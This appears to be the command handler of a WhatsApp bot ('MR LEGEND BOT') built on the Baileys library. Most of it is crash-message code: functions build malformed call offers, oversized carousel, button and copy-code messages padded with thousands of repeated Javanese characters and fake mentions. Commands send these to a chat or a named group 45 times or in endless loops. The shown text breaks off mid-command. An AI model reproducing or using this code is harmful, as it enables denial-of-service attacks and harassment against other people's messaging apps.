process.on('uncaughtException', console.error)
require("./config")
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./WhatsApp_DataBase/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./WhatsApp_DataBase/exif.js')
global.botMode = 'free'
const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const ytdl = require('ytdl-core');
const yts = require('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const { spawn } = require('child_process')
const crypto = require('crypto');
const path = require('path')
const ms = require('ms');
const os = require('os')

module.exports = async (XeonBotInc, m) => {
try {
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)

const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";

const isOwner = sender === botNumber
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const data = date = dataa = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

const wm = "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓"
const { legendbug } = require('./WhatsApp_DataBase/legendbug');

const replygcxeon2 = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363420097356422@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://e.top4top.io/p_3669nw21t1.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
                        }, {quoted:m})

}

const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363420097356422@newsletter",
}
}
                        }, {quoted:m})

}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync(__filename, 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   

//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅
const callDestroyer = async (XeonBotInc, target) => {
   let devices = (await XeonBotInc.getUSyncDevices([target], false, false)).map(({
      user,
      device
   }) => `${user}:${device || ''}@s.whatsapp.net`);
   await XeonBotInc.assertSessions(devices);
   let createMutex = () => {
      let map = {};
      return {
         mutex(key, fn) {
            map[key] ??= {
               task: Promise.resolve()
            };
            map[key].task = (async prev => {
               try {
                  await prev;
               } catch {}
               return fn();
            })(map[key].task);
            return map[key].task;
         }
      };
   };
   let mutexManager = createMutex();
   let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
   let originalCreateParticipantNodes = XeonBotInc.createParticipantNodes.bind(XeonBotInc);
   let encodeMsg = XeonBotInc.encodeWAMessage?.bind(XeonBotInc);
   XeonBotInc.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return {
         nodes: [],
         shouldIncludeDeviceIdentity: false
      };
      let patched = await (XeonBotInc.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let mapped = Array.isArray(patched) ? patched : recipientJids.map(jid => ({
         recipientJid: target,
         message: patched
      }));
      let {
         id: meId,
         lid: meLid
      } = XeonBotInc.authState.creds.me;
      let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;
      let nodes = await Promise.all(mapped.map(async ({
         recipientJid: jid,
         message: msg
      }) => {
         let {
            user: targetUser
         } = jidDecode(jid);
         let {
            user: ownPnUser
         } = jidDecode(meId);
         let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
         let isSelf = jid === meId || jid === meLid;
         if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;
         let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));
         return mutexManager.mutex(target, async () => {
            let {
               type,
               ciphertext
            } = await XeonBotInc.signalRepository.encryptMessage({
               jid,
               data: bytes
            });
            if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
            return {
               tag: 'to',
               attrs: {
                  jid
               },
               content: [{
                  tag: 'enc',
                  attrs: {
                     v: '2',
                     type,
                     ...extraAttrs
                  },
                  content: ciphertext
               }]
            };
         });
      }));
      return {
         nodes: nodes.filter(Boolean),
         shouldIncludeDeviceIdentity
      };
   };
   let {
      nodes: destinations,
      shouldIncludeDeviceIdentity
   } = await XeonBotInc.createParticipantNodes(devices, {
      conversation: "y"
   }, {
      count: '0'
   });
   let callNode = {
      tag: "call",
      attrs: {
         to: target,
         id: XeonBotInc.generateMessageTag(),
         from: XeonBotInc.user.id
      },
      content: [{
         tag: "offer",
         attrs: {
            "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
            "call-creator": XeonBotInc.user.id
         },
         content: [{
            tag: "audio",
            attrs: {
               enc: "opus",
               rate: "16000"
            }
         }, {
            tag: "audio",
            attrs: {
               enc: "opus",
               rate: "8000"
            }
         }, {
            tag: "video",
            attrs: {
               orientation: "0",
               screen_width: "1920",
               screen_height: "1080",
               device_orientation: "0",
               enc: "vp8",
               dec: "vp8"
            }
         }, {
            tag: "net",
            attrs: {
               medium: "3"
            }
         }, {
            tag: "capability",
            attrs: {
               ver: "1"
            },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
         }, {
            tag: "encopt",
            attrs: {
               keygen: "2"
            }
         }, {
            tag: "destination",
            attrs: {},
            content: destinations
         }, ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true)
         }] : [])]
      }]
   };
   await XeonBotInc.sendNode(callNode);
}


//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅
   const buttonv = [
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
            ];
   
   
                 ContextInfoBotAi = {
                mentionedJid: Array.from(
                    { length:2000 },
                    (_, z) => `1313555020${z + 1}@s.whatsapp.net`
                ),
                isForwarded: true,
                forwardingScore: 2085,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "7eppeli"
                },
                participant: "13135550202@bot",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: "UPI",
                        expiryTimestamp: Date.now()
                    }
                },
                remoteJid: "FineShyt"
            };

                  headerFlowPP = {
                    title: `${pushname}` + "ꦾꦾꦾ".repeat(999),
                  "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          },
                    hasMediaAttachment: true
              };


                  buttonsFlowThejo = [{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "🦠" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
}, {
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "🦠" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
}, {
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "🦠" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
}];


              MsgCarousel = {
                cards: [
                
                {
                  header: headerFlowPP,
                  body: {
                    text: ""
                  },
                  footer: {
                    text: wm
                  },
                  nativeFlowMessage: {
                  buttons: buttonsFlowThejo
                }
                }]
               };

//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅
    async function sendBugProfile(target, kotet) {
      const Content = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: `𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓` + "ꦾꦾꦾ".repeat(999)
              },
              footer: {
                text: wm
              },
              carouselMessage: MsgCarousel,
              contextInfo: ContextInfoBotAi
            }
          }
        }
      }, {userJid:target});
     await XeonBotInc.relayMessage(target, Content.message, {
        messageId: XeonBotInc.generateMessageTag(), 
      });
      console.log(chalk.red.bold(`
╭───────────────────────────────────
├➤${chalk.blue(`Succes Send Bug To ${target}`)}
╰───────────────────────────────────`));
    }

//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅
async function sendNaflow(target) {
for (let nc = 0; nc < 5; nc++) {
jw = "\n";
for (let ne = 0; ne < 6; ne++) {
jw +=`${legendbug}` + "\n";
}
jw += "";
await XeonBotInc.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "\n"
},
header: {},
nativeFlowMessage: {
buttons: [{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "COPY" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" + 'ꦾꦷꦾꦷꦷꦷ'.repeat(6000),
copy_code: + `${wm}`,
})
}, 
]
}
}
}
}
}, { });
await sleep(500)
}
   console.log(chalk.red.bold(`
╭───────────────────────────────────
├➤${chalk.blue(`Succes Send Bug To ${target}`)}
╰───────────────────────────────────`));
    }
//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅
    async function sendCarousel(target) {
      const Content = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" + "ꦾꦾꦾ".repeat(999)
              },
              footer: {
                text: wm
              },
              carouselMessage: {
                cards: [{
                  header: {
                    title: "ꦾꦾꦾ".repeat(999),
                    imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                      fileLength: "164089",
                      height: 1,
                      width: 1,
                      mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                      fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                      directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1749172037",
                      jpegThumbnail: null,
                      scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                      scanLengths: [8596, 155493]
                    },
                    hasMediaAttachment: true
                  },
                  body: {
                    text: ""
                  },
                  footer: {
                    text: wm
                  },
                  nativeFlowMessage: {
buttons: [{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "COPY" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
},
{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "COPY" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
},
{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "COPY" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
},
{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "COPY" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
},
{
name: "cta_copy",
    buttonParamsJson: JSON.stringify({
display_text: "COPY" + `${legendbug}`,
url: "https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp" ,
copy_code: + `${wm}`,
})
}
]
}
                }]
              },
              contextInfo: ContextInfoBotAi
            }
          }
        }
      }, {});
      await XeonBotInc.relayMessage(target, Content.message, {
        messageId: Content.key.id
      });
      console.log(chalk.red.bold(`
╭───────────────────────────────────
├➤${chalk.blue(`Succes Send Bug To ${target}`)}
╰───────────────────────────────────`));
    }
//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅
const bugbutton = async (XeonBotInc, target) => {
try {
            const buttons = [
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
                { buttonId: `${prefix}𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓`, buttonText: { displayText: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +legendbug}, type: 1 },
            ]

            const buttonMessage = {
                text: '𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓' + "ꦾꦾꦾ".repeat(999),
                footer: wm,
                buttons: buttons,
                headerType: 2
            }

            await XeonBotInc.sendMessage(target, buttonMessage,
             { });
        } catch (err) {}
}

//✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅✅

switch(command) {

///////////////////// START IN PLACE BUG /////////////////////

case 'legend1': {
if (!isCreator && !isOwner) return  
for (let i = 0; i < 45; i++) {
await callDestroyer(XeonBotInc, m.chat)
}
}
break 

case 'legend2': {
if (!isCreator) return 
for (let i = 0; i < 45; i++) {
await sendCarousel(m.chat)
}
}
break 

case 'legend3': {
if (!isCreator) return 
for (let i = 0; i < 45; i++) {
await sendBugProfile(m.chat)
}
}
break 

case 'legend4': {
if (!isCreator) return 
for (let i = 0; i < 45; i++) {
await bugbutton(XeonBotInc, m.chat)
}
}
break 

case 'legend5': {
if (!isCreator) return 
for (let i = 0; i < 45; i++) {
await sendNaflow(m.chat)
}
}
break 

case 'legend6': {
if (!isCreator && !isOwner) return  
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(m.chat, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(m.chat)
await sendCarousel(m.chat);
await sendBugProfile(m.chat);
await bugbutton(XeonBotInc, m.chat);
}
}
break 

case 'legend7': {
if (!isCreator && !isOwner) return  
    while (true) {
await XeonBotInc.sendMessage(m.chat, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(m.chat)
await sendCarousel(m.chat);
await sendBugProfile(m.chat);
await bugbutton(XeonBotInc, m.chat);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break;

case 'legend8': {
if (!isCreator && !isOwner) return  
    while (true) {
await sendBugProfile(m.chat);
await Crashuix(m.chat);
await XeonBotInc.sendMessage(m.chat, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendCarousel(m.chat);
await sendBugProfile(m.chat);
await bugbutton(XeonBotInc, m.chat);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break;

case 'legend9': {
if (!isCreator && !isOwner) return  
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(m.chat, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendCarousel(m.chat);
await sendBugProfile(m.chat);
await bugbutton(XeonBotInc, m.chat);
}
}
break 
///////////////////// END IN PLACE BUG /////////////////////


///////////////////// START GROUP ID BUG /////////////////////
case 'legendgpid1': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Group ID?\nExample: ${prefix+command} (idgc)`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
  toidgc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
    while (true) {
await XeonBotInc.sendMessage(toidgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(toidgc);
await sendCarousel(toidgc);
await sendBugProfile(toidgc);
await bugbutton(XeonBotInc, toidgc);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break;

case 'legendgpid2': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Group ID?\nExample: ${prefix+command} (idgc)`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
  toidgc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
    while (true) {
await XeonBotInc.sendMessage(toidgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendCarousel(toidgc);
await sendBugProfile(toidgc);
await bugbutton(XeonBotInc, toidgc);
await sendNaflow(toidgc);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break;

case 'legendgpid3': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Group ID?\nExample: ${prefix+command} (idgc)`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
  toidgc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(toidgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendBugProfile(toidgc);
await bugbutton(XeonBotInc, toidgc);
await sendNaflow(toidgc);
}
}
break;

case 'legendgpid4': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Group ID?\nExample: ${prefix+command} (idgc)`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
  toidgc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@g.us"
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(toidgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
